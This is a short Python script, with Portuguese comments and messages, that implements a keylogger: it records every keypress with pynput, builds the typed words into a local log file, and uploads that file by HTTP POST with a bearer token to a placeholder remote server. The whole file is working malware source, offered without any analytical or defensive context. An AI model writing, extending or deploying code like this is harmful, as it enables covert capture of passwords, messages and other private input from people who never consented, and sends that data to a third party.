from pynput.keyboard import Key, Listener
import time
import requests
import os

fullLog = ''
words = ''
SERVER_URL = "http://SEU_SERVIDOR:8000/log"
AUTH_TOKEN = "SUA_TOKEN_SECRETA_AQUI"
FILEPATH = "log.txt"
SEND_INTERVAL = 5

def onPress(key):
    global fullLog
    global words
    if key == Key.space:
        words += ' '

    elif key == Key.backspace:
        words = words[:-1]

    elif key == Key.enter:
        fullLog += words + '\n'
        with open("log.txt", "a") as f:
            f.write(fullLog)

        words = ''
        fullLog = ''
    
    else:
        char = f'{key}'
        char = char.replace("'", "")
        words += char
    
    if key == Key.esc:
        return False
    
def send_file(filepath):
    if not os.path.exists(filepath):
        print("Arquivo não existe:", filepath)
        return False
    try:
        with open(filepath, "rb") as f:
            files = {"file": (os.path.basename(filepath), f)}
            headers = {"Authorization": f"Bearer {AUTH_TOKEN}"}
            resp = requests.post(SERVER_URL, files=files, headers=headers, timeout=10)
        if resp.status_code == 200:
            print("Enviado com sucesso:", resp.json())
            return True
        else:
            print("Falha no envio:", resp.status_code, resp.text)
            return False
    except Exception as e:
        print("Erro ao enviar, mensagem enviada:", e)
        return False
    
def main():
    with Listener(on_press=onPress) as k_listener:
        send_file(FILEPATH)
        time.sleep(SEND_INTERVAL)
        k_listener.join()

if __name__ == "__main__":
    main()